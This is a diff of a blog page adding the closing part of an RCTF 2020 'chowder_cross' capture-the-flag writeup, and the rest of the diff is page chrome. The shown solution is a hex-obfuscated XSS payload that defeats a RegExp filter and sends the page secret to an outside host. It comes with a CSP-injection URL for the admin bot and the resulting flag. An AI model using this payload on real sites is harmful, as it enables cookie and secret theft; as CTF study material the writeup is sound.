+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce=bc36554eab55edbbbc04c995d733085a&gt;RegExp.prototype.test = function()&#123;return false&#125;;var a =&quot;&lt;ifra&quot;.concat(&quot;me sr&quot;,&quot;cdoc=&apos;\x3c\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3d\x22\x68\x74\x74\x70\x3a\x2f\x2f\x31\x32\x34\x2e\x31\x35\x36\x2e\x31\x33\x39\x2e\x32\x33\x38\x2f\x66\x6c\x61\x67\x2e\x70\x68\x70\x3f\x66\x3d\x31\x22\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x3c\x73\x63\x72\x69\x70\x74\x20\x6e\x6f\x6e\x63\x65\x3d\x62\x63\x33\x36\x35\x35\x34\x65\x61\x62\x35\x35\x65\x64\x62\x62\x62\x63\x30\x34\x63\x39\x39\x35\x64\x37\x33\x33\x30\x38\x35\x61\x3e\x6c\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x68\x72\x65\x66\x3d\x22\x68\x74\x74\x70\x73\x3a\x2f\x2f\x78\x73\x73\x2e\x6d\x75\x73\x65\x6c\x6a\x68\x2e\x6c\x69\x76\x65\x2f\x3f\x63\x6f\x6f\x6b\x69\x65\x3d\x22\x2b\x67\x65\x74\x5f\x73\x65\x63\x72\x65\x74\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e&apos;&gt;&quot;);document.body.innerHTML=a;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>And send the following url to the administrator:</p>
+<p><code>/;frame-src *;/?action=post&amp;id=0aaf916cbd820bafc4c88fab90e0130f</code></p>
+<p>You will get the flag following:</p>
+<p><code>flag:RCTF{7JKxVdKaaMD7ZjzMVXBQlC8r}</code></p>
 
       
     </div>
@@ -490,12 +485,12 @@
   <!-- JS库 sweetalert 可修改路径 -->
   <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-  <p><span>本文标题:</span><a href="/2019/04/24/a/">ctf中的php反射</a></p>
-  <p><span>文章作者:</span><a href="/" title="访问 LJH 的个人博客">LJH</a></p>
-  <p><span>发布时间:</span>2019年04月24日 - 15:20</p>
-  <p><span>最后更新:</span>2019年04月24日 - 15:23</p>
-  <p><span>原始链接:</span><a href="/2019/04/24/a/" title="ctf中的php反射">https://museljh.github.io/2019/04/24/a/</a>
-    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://museljh.github.io/2019/04/24/a/" aria-label="复制成功！"></i></span>
+  <p><span>本文标题:</span><a href="/2020/06/01/RCTF2020-chowder-cross-writeup/">RCTF2020 chowder_cross writeup</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 MuseLJH 的个人博客">MuseLJH</a></p>
+  <p><span>发布时间:</span>2020年06月01日 - 10:16</p>
+  <p><span>最后更新:</span>2020年06月01日 - 12:10</p>
+  <p><span>原始链接:</span><a href="/2020/06/01/RCTF2020-chowder-cross-writeup/" title="RCTF2020 chowder_cross writeup">https://museljh.github.io/2020/06/01/RCTF2020-chowder-cross-writeup/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://museljh.github.io/2020/06/01/RCTF2020-chowder-cross-writeup/" aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
 </div>
@@ -536,7 +531,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/php/" rel="tag"><i class="fa fa-tag"></i> php</a>
+            <a href="/tags/xss/" rel="tag"><i class="fa fa-tag"></i> xss</a>
           
         </div>
       
@@ -549,8 +544,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/03/29/bypass disable function的学习与实践/" rel="next" title="bypass disable function的学习与实践">
-                <i class="fa fa-chevron-left"></i> bypass disable function的学习与实践
+              <a href="/2019/07/15/Discuz!ML V3.X 代码注入复现与分析/" rel="next" title="Discuz!ML V3.X 代码注入复现与原理分析">
+                <i class="fa fa-chevron-left"></i> Discuz!ML V3.X 代码注入复现与原理分析
               </a>
             
           </div>
@@ -558,10 +553,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/04/24/ctf中的php反射/" rel="prev" title="a">
-                a <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -589,11 +580,6 @@
 
 
           
-
-  
-    <div class="comments" id="comments">
-      <div id="lv-container" data-id="city" data-uid="MTAyMC80MjUxOC8xOTA2NQ=="></div>
-    </div>
 
   
 
@@ -632,10 +618,10 @@
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
-              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="LJH">
+              <img class="site-author-image" itemprop="image" src="/images/LJH.jpg" alt="MuseLJH">
             
-              <p class="site-author-name" itemprop="name">LJH</p>
-              <p class="site-description motion-element" itemprop="description">无</p>
+              <p class="site-author-name" itemprop="name">MuseLJH</p>
+              <p class="site-description motion-element" itemprop="description">web手</p>
           </div>
 
           <nav class="site-state motion-element">
@@ -645,7 +631,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-count">35</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -656,7 +642,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -667,7 +653,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-count">26</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -729,7 +715,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#正文"><span class="nav-number">2.</span> <span class="nav-text">正文</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#RCTF-2020-chowder-cross-writeup"><span class="nav-number">1.</span> <span class="nav-text">RCTF 2020 chowder_cross writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一-csp-police-inject-firefox-import-css-to-leak-nonce"><span class="nav-number">1.1.</span> <span class="nav-text">(一) csp police inject + firefox import css to leak nonce</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-csp-police-inject"><span class="nav-number">1.1.1.</span> <span class="nav-text">1. csp police inject</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-firefox-import-css-to-leak-nonce"><span class="nav-number">1.1.2.</span> <span class="nav-text">2.firefox import css to leak nonce</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二-cover-bypass-RegExp-iframe-xssi"><span class="nav-number">1.2.</span> <span class="nav-text">(二) cover bypass RegExp + iframe xssi</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-cover-bypass-RegExp"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.cover bypass RegExp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-iframe-xssi"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.iframe xssi</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
@@ -887,17 +873,6 @@
 
 
 
-  
-    <script type="text/javascript">
-      (function(d, s) {
-        var j, e = d.getElementsByTagName(s)[0];
-        if (typeof LivereTower === 'function') { return; }
-        j = d.createElement(s);
-        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
-        j.async = true;
-        e.parentNode.insertBefore(j, e);
-      })(document, 'script');
-    </script>
   
 
 
@@ -1235,113 +1210,6 @@
 
 
   
-
-  
-  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
-  <script>AV.initialize("otYDWvApXTYxWRiyvbntKaiI-gzGzoHsz#<app_id>", "BGOUX1v4oeMfXIDWyV4dxdUt#<app_key>");</script>
-  <script>
-    function showTime(Counter) {
-      var query = new AV.Query(Counter);
-      var entries = [];
-      var $visitors = $(".leancloud_visitors");
-
-      $visitors.each(function () {
-        entries.push( $(this).attr("id").trim() );
-      });
-
-      query.containedIn('url', entries);
-      query.find()
-        .done(function (results) {
-          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
-
-          if (results.length === 0) {
-            $visitors.find(COUNT_CONTAINER_REF).text(0);
-            return;
-          }
-
-          for (var i = 0; i < results.length; i++) {
-            var item = results[i];
-            var url = item.get('url');
-            var time = item.get('time');
-            var element = document.getElementById(url);
-
-            $(element).find(COUNT_CONTAINER_REF).text(time);
-          }
-          for(var i = 0; i < entries.length; i++) {
-            var url = entries[i];
-            var element = document.getElementById(url);
-            var countSpan = $(element).find(COUNT_CONTAINER_REF);
-            if( countSpan.text() == '') {
-              countSpan.text(0);
-            }
-          }
-        })
-        .fail(function (object, error) {
-          console.log("Error: " + error.code + " " + error.message);
-        });
-    }
-
-    function addCount(Counter) {
-      var $visitors = $(".leancloud_visitors");
-      var url = $visitors.attr('id').trim();
-      var title = $visitors.attr('data-flag-title').trim();
-      var query = new AV.Query(Counter);
-
-      query.equalTo("url", url);
-      query.find({
-        success: function(results) {
-          if (results.length > 0) {
-            var counter = results[0];
-            counter.fetchWhenSave(true);
-            counter.increment("time");
-            counter.save(null, {
-              success: function(counter) {
-                var $element = $(document.getElementById(url));
-                $element.find('.leancloud-visitors-count').text(counter.get('time'));
-              },
-              error: function(counter, error) {
-                console.log('Failed to save Visitor num, with error message: ' + error.message);
-              }
-            });
-          } else {
-            var newcounter = new Counter();
-            /* Set ACL */
-            var acl = new AV.ACL();
-            acl.setPublicReadAccess(true);
-            acl.setPublicWriteAccess(true);
-            newcounter.setACL(acl);
-            /* End Set ACL */
-            newcounter.set("title", title);
-            newcounter.set("url", url);
-            newcounter.set("time", 1);
-            newcounter.save(null, {
-              success: function(newcounter) {
-                var $element = $(document.getElementById(url));
-                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
-              },
-              error: function(newcounter, error) {
-                console.log('Failed to create');
-              }
-            });
-          }
-        },
-        error: function(error) {
-          console.log('Error:' + error.code + " " + error.message);
-        }
-      });
-    }
-
-    $(function() {
-      var Counter = AV.Object.extend("Counter");
-      if ($('.leancloud_visitors').length == 1) {
-        addCount(Counter);
-      } else if ($('.post-title-link').length > 1) {
-        showTime(Counter);
-      }
-    });
-  </script>
-
-
 
   
 
